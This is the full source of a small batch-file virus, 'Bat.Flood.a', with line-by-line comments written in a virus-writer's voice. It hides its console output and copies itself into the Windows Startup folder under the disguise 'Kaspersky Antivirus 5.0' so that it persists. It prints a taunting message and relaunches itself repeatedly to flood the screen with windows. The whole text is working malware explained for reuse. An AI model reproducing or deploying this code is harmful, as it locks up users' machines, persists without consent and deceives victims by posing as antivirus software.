::
:: Bat.Flood.a [DvL] on 16.08.2003
::
cls
::
:: ^ clears the screen
::
@echo off
ctty nul
::
:: ^ disables the monitor output to hide the process
::
@copy %0 c:\windows\startm~1\programs\startup\"Kaspersky Antivirus 5.0".bat >nul
::
:: ^ copying the virus in StartUp folder to run every time the computer is restarted
::
@echo.
@echo.
@echo.
@echo.
@echo.
@echo HA HA HA HA HA HA HA HA HA HA HA HA HA !!!
::
:: ^ message payload: laughing about you
::
@start /max %0
::
:: ^ the command which will flood u with windows
::   accidentaly found, also seened in SAD1c`z article
::